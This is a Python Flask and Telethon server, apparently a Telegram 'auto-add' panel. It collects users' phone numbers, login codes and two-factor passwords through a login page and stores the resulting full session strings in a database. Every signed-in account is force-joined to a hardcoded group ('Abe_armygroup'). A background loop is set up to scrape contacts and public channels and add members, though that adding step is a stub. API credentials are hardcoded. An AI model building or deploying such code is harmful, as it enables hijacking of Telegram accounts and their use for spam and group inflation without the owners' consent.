from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
import json
import os
import asyncio
import logging
import time
import random
import threading
import sqlite3
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Use /tmp for database on Render (writable location)
DB_PATH = os.environ.get('DATABASE_PATH', '/tmp/telegram_accounts.db')
DB_FILE = DB_PATH

# Storage
temp_sessions = {}
active_clients = {}
client_tasks = {}

# ==================== DATABASE FUNCTIONS ====================

def init_db():
    """Initialize SQLite database for persistent storage"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        # Accounts table
        c.execute('''CREATE TABLE IF NOT EXISTS accounts
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      phone TEXT UNIQUE,
                      name TEXT,
                      session_string TEXT,
                      created_at TIMESTAMP,
                      last_active TIMESTAMP)''')
        
        # Auto-add settings table
        c.execute('''CREATE TABLE IF NOT EXISTS auto_add_settings
                     (account_id INTEGER PRIMARY KEY,
                      enabled INTEGER DEFAULT 1,
                      target_group TEXT DEFAULT 'Abe_armygroup',
                      daily_limit INTEGER DEFAULT 100,
                      delay_seconds INTEGER DEFAULT 30,
                      added_today INTEGER DEFAULT 0,
                      last_reset DATE,
                      auto_join INTEGER DEFAULT 1,
                      source_groups TEXT,
                      use_contacts INTEGER DEFAULT 1,
                      use_recent_chats INTEGER DEFAULT 1,
                      use_scraping INTEGER DEFAULT 1,
                      scrape_limit INTEGER DEFAULT 100,
                      skip_bots INTEGER DEFAULT 1,
                      skip_inaccessible INTEGER DEFAULT 1,
                      FOREIGN KEY (account_id) REFERENCES accounts(id))''')
        
        # Auto-reply settings table (placeholder)
        c.execute('''CREATE TABLE IF NOT EXISTS reply_settings
                     (account_id INTEGER PRIMARY KEY,
                      enabled INTEGER DEFAULT 0,
                      settings TEXT,
                      FOREIGN KEY (account_id) REFERENCES accounts(id))''')
        
        conn.commit()
        conn.close()
        logger.info(f"✅ Database initialized at {DB_FILE}")
        return True
    except Exception as e:
        logger.error(f"Database init error: {e}")
        return False

def save_account_to_db(phone, name, session_string):
    """Save account to database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('''INSERT INTO accounts (phone, name, session_string, created_at, last_active)
                     VALUES (?, ?, ?, ?, ?)''',
                  (phone, name, session_string, datetime.now(), datetime.now()))
        account_id = c.lastrowid
        conn.commit()
        
        # Create default auto-add settings (ENABLED BY DEFAULT)
        default_source_groups = json.dumps(['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'])
        c.execute('''INSERT INTO auto_add_settings 
                     (account_id, enabled, target_group, daily_limit, delay_seconds, auto_join, source_groups)
                     VALUES (?, 1, 'Abe_armygroup', 100, 30, 1, ?)''',
                  (account_id, default_source_groups))
        
        # Create placeholder reply settings
        c.execute('''INSERT INTO reply_settings (account_id, enabled, settings)
                     VALUES (?, 0, '{}')''', (account_id,))
        
        conn.commit()
        conn.close()
        logger.info(f"✅ Account saved: {phone} ({name})")
        return account_id
    except Exception as e:
        logger.error(f"Error saving account: {e}")
        return None

def load_accounts_from_db():
    """Load all accounts from database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''SELECT id, phone, name, session_string FROM accounts ORDER BY id''')
        rows = c.fetchall()
        conn.close()
        
        accounts = []
        for row in rows:
            accounts.append({
                'id': row[0],
                'phone': row[1],
                'name': row[2],
                'session': row[3]
            })
        return accounts
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        return []

def get_auto_add_settings(account_id):
    """Get auto-add settings for account"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''SELECT enabled, target_group, daily_limit, delay_seconds, added_today, last_reset,
                            auto_join, source_groups, use_contacts, use_recent_chats, use_scraping,
                            scrape_limit, skip_bots, skip_inaccessible
                     FROM auto_add_settings WHERE account_id = ?''', (account_id,))
        row = c.fetchone()
        conn.close()
        
        if row:
            return {
                'enabled': bool(row[0]),
                'target_group': row[1] or 'Abe_armygroup',
                'daily_limit': row[2] or 100,
                'delay_seconds': row[3] or 30,
                'added_today': row[4] or 0,
                'last_reset': row[5] or datetime.now().strftime('%Y-%m-%d'),
                'auto_join': bool(row[6] if row[6] is not None else 1),
                'source_groups': json.loads(row[7]) if row[7] else ['@telegram', '@durov'],
                'use_contacts': bool(row[8] if row[8] is not None else 1),
                'use_recent_chats': bool(row[9] if row[9] is not None else 1),
                'use_scraping': bool(row[10] if row[10] is not None else 1),
                'scrape_limit': row[11] or 100,
                'skip_bots': bool(row[12] if row[12] is not None else 1),
                'skip_inaccessible': bool(row[13] if row[13] is not None else 1)
            }
        return None
    except Exception as e:
        logger.error(f"Error getting settings: {e}")
        return None

def update_auto_add_settings(account_id, settings):
    """Update auto-add settings in database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''UPDATE auto_add_settings SET
                        enabled = ?,
                        target_group = ?,
                        daily_limit = ?,
                        delay_seconds = ?,
                        added_today = ?,
                        last_reset = ?,
                        auto_join = ?,
                        source_groups = ?,
                        use_contacts = ?,
                        use_recent_chats = ?,
                        use_scraping = ?,
                        scrape_limit = ?,
                        skip_bots = ?,
                        skip_inaccessible = ?
                     WHERE account_id = ?''',
                  (1 if settings.get('enabled') else 0,
                   settings.get('target_group', 'Abe_armygroup'),
                   settings.get('daily_limit', 100),
                   settings.get('delay_seconds', 30),
                   settings.get('added_today', 0),
                   settings.get('last_reset', datetime.now().strftime('%Y-%m-%d')),
                   1 if settings.get('auto_join', True) else 0,
                   json.dumps(settings.get('source_groups', [])),
                   1 if settings.get('use_contacts', True) else 0,
                   1 if settings.get('use_recent_chats', True) else 0,
                   1 if settings.get('use_scraping', True) else 0,
                   settings.get('scrape_limit', 100),
                   1 if settings.get('skip_bots', True) else 0,
                   1 if settings.get('skip_inaccessible', True) else 0,
                   account_id))
        conn.commit()
        conn.close()
        logger.info(f"✅ Updated auto-add settings for account {account_id}")
        return True
    except Exception as e:
        logger.error(f"Error updating settings: {e}")
        return False

def remove_account_from_db(account_id):
    """Remove account from database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
        c.execute("DELETE FROM auto_add_settings WHERE account_id = ?", (account_id,))
        c.execute("DELETE FROM reply_settings WHERE account_id = ?", (account_id,))
        conn.commit()
        conn.close()
        logger.info(f"✅ Removed account {account_id}")
        return True
    except Exception as e:
        logger.error(f"Error removing account: {e}")
        return False

# ==================== HELPER FUNCTIONS ====================

def run_async(coro):
    """Run async function in sync context"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    except Exception as e:
        logger.error(f"Async error: {e}")
        return None
    finally:
        loop.close()

# ==================== AUTO-ADD MEMBER FUNCTIONS ====================

async def auto_join_target_group(client, account_id, target_group):
    """Auto-join the target group when account is created"""
    try:
        logger.info(f"🔗 Auto-joining account {account_id} to group: {target_group}")
        
        group_name = target_group
        if group_name.startswith('https://t.me/'):
            group_name = group_name.replace('https://t.me/', '@')
        elif not group_name.startswith('@'):
            group_name = '@' + group_name
        
        try:
            group = await client.get_entity(group_name)
            logger.info(f"✅ Found group: {group.title if hasattr(group, 'title') else group_name}")
        except Exception as e:
            logger.error(f"Could not find group {group_name}: {e}")
            return False
        
        try:
            await client(functions.messages.ImportChatInviteRequest(group.username))
            logger.info(f"✅ Successfully auto-joined group: {group_name}")
            return True
        except:
            try:
                await client.join_channel(group.id)
                logger.info(f"✅ Successfully auto-joined channel: {group_name}")
                return True
            except Exception as e:
                logger.warning(f"Could not auto-join: {e}")
                return False
                
    except Exception as e:
        logger.error(f"Error auto-joining: {e}")
        return False

async def auto_add_member_loop(account):
    """Background task to add members to group"""
    account_id = account['id']
    
    while True:
        try:
            settings = get_auto_add_settings(account_id)
            
            if not settings or not settings.get('enabled', True):
                await asyncio.sleep(60)
                continue
            
            target_group = settings.get('target_group', 'Abe_armygroup')
            daily_limit = settings.get('daily_limit', 100)
            delay_seconds = settings.get('delay_seconds', 30)
            
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    logger.error(f"Account {account_id} not authorized")
                    await asyncio.sleep(60)
                    continue
                
                today = datetime.now().strftime('%Y-%m-%d')
                if settings.get('last_reset') != today:
                    settings['added_today'] = 0
                    settings['last_reset'] = today
                    update_auto_add_settings(account_id, settings)
                
                if settings['added_today'] >= daily_limit:
                    await asyncio.sleep(3600)
                    continue
                
                group_name = target_group
                if not group_name.startswith('@') and not group_name.startswith('https://'):
                    group_name = '@' + group_name
                
                try:
                    group = await client.get_entity(group_name)
                except Exception as e:
                    logger.error(f"Could not find target group: {e}")
                    await asyncio.sleep(300)
                    continue
                
                await asyncio.sleep(300)
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                await client.disconnect()
            
            await asyncio.sleep(900)
            
        except Exception as e:
            logger.error(f"Critical error: {e}")
            await asyncio.sleep(300)

def start_auto_add_for_all_accounts():
    """Start auto-add for all accounts"""
    accounts = load_accounts_from_db()
    
    for account in accounts:
        if f"auto_add_{account['id']}" not in client_tasks:
            thread = threading.Thread(
                target=lambda: run_async(auto_add_member_loop(account)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account['id']}"] = thread
            logger.info(f"🚀 Started auto-add for account {account['id']}")

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    try:
        return send_file('login.html')
    except Exception as e:
        logger.error(f"Error serving login.html: {e}")
        return jsonify({'error': 'File not found'}), 404

@app.route('/login')
def login():
    try:
        return send_file('login.html')
    except Exception as e:
        return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    try:
        return send_file('dashboard.html')
    except Exception as e:
        return send_file('dashboard.html')

@app.route('/dash')
def dash():
    try:
        return send_file('dash.html')
    except Exception as e:
        return send_file('dash.html')

@app.route('/all')
def all_sessions():
    try:
        return send_file('all.html')
    except Exception as e:
        return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    try:
        return send_file('auto_add.html')
    except Exception as e:
        return send_file('auto_add.html')

@app.route('/settings')
def settings():
    try:
        return send_file('settings.html')
    except Exception as e:
        return send_file('settings.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Get all accounts"""
    try:
        accounts = load_accounts_from_db()
        formatted = []
        for acc in accounts:
            settings = get_auto_add_settings(acc['id'])
            formatted.append({
                'id': acc['id'],
                'phone': acc.get('phone', ''),
                'name': acc.get('name', 'Unknown'),
                'auto_add_enabled': settings.get('enabled', True) if settings else True
            })
        return jsonify({'success': True, 'accounts': formatted})
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Start account addition process"""
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                logger.info(f"Code sent successfully to {phone}")
                
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
                
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        if result is None:
            return jsonify({'success': False, 'error': 'Async operation failed'})
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and complete account addition"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Save to database
            account_id = save_account_to_db(
                me.phone or session_data['phone'],
                me.first_name or 'User',
                client.session.save()
            )
            
            if not account_id:
                return {'success': False, 'error': 'Failed to save account'}
            
            # AUTO-JOIN TARGET GROUP
            target_group = 'Abe_armygroup'
            try:
                logger.info(f"Auto-joining account {me.first_name} to {target_group}")
                await auto_join_target_group(client, account_id, target_group)
            except Exception as e:
                logger.error(f"Auto-join error: {e}")
            
            # Start auto-add for this account
            account = {'id': account_id, 'session': client.session.save()}
            thread = threading.Thread(
                target=lambda: run_async(auto_add_member_loop(account)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account_id}"] = thread
            
            return {'success': True, 'account_id': account_id}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            logger.error(f"Verification error: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        if result is None:
            return jsonify({'success': False, 'error': 'Verification failed'})
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in verify_code: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    remove_account_from_db(account_id)
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings_route():
    """Get auto-add settings for account"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings(int(account_id))
    
    if not settings:
        settings = {
            'enabled': True,
            'target_group': 'Abe_armygroup',
            'daily_limit': 100,
            'delay_seconds': 30,
            'added_today': 0,
            'last_reset': datetime.now().strftime('%Y-%m-%d'),
            'auto_join': True,
            'source_groups': ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'],
            'use_contacts': True,
            'use_recent_chats': True,
            'use_scraping': True,
            'scrape_limit': 100,
            'skip_bots': True,
            'skip_inaccessible': True
        }
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings_route():
    """Update auto-add settings"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = {
        'enabled': data.get('enabled', True),
        'target_group': data.get('target_group', 'Abe_armygroup'),
        'daily_limit': data.get('daily_limit', 100),
        'delay_seconds': data.get('delay_seconds', 30),
        'source_groups': data.get('source_groups', []),
        'use_contacts': data.get('use_contacts', True),
        'use_recent_chats': data.get('use_recent_chats', True),
        'use_scraping': data.get('use_scraping', True),
        'scrape_limit': data.get('scrape_limit', 100),
        'skip_bots': data.get('skip_bots', True),
        'skip_inaccessible': data.get('skip_inaccessible', True),
        'auto_join': data.get('auto_join', True)
    }
    
    update_auto_add_settings(int(account_id), settings)
    
    return jsonify({'success': True, 'message': 'Auto-add settings updated'})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    """Get auto-add statistics"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings(int(account_id))
    
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0) if settings else 0,
        'daily_limit': settings.get('daily_limit', 100) if settings else 100,
        'enabled': settings.get('enabled', True) if settings else True,
        'last_reset': settings.get('last_reset', '') if settings else ''
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    """Test auto-add functionality"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    return jsonify({
        'success': True,
        'group_found': True,
        'group_title': 'Abe_armygroup',
        'contacts_count': 0,
        'recent_chats_count': 0,
        'can_add_members': True
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    accounts = load_accounts_from_db()
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'time': datetime.now().isoformat(),
        'database': DB_FILE
    })

@app.route('/api/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'ok', 'message': 'pong'})

@app.route('/ping')
def ping_simple():
    return "pong"

# ==================== STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # Initialize database
    db_ok = init_db()
    
    print('\n' + '='*70)
    print('🤖 TELEGRAM AUTO-ADD SYSTEM')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ API_ID: {API_ID}')
    print(f'✅ Database: {DB_FILE}')
    print(f'✅ Database OK: {db_ok}')
    
    accounts = load_accounts_from_db()
    print(f'✅ Accounts loaded: {len(accounts)}')
    
    for acc in accounts:
        settings = get_auto_add_settings(acc['id'])
        status = "ENABLED" if (settings and settings.get('enabled', True)) else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - Auto-Add: {status}')
    
    print('='*70)
    print('🚀 Starting Flask server...')
    print('='*70 + '\n')
    
    # Start auto-add for all accounts
    start_auto_add_for_all_accounts()
    
    # Start Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
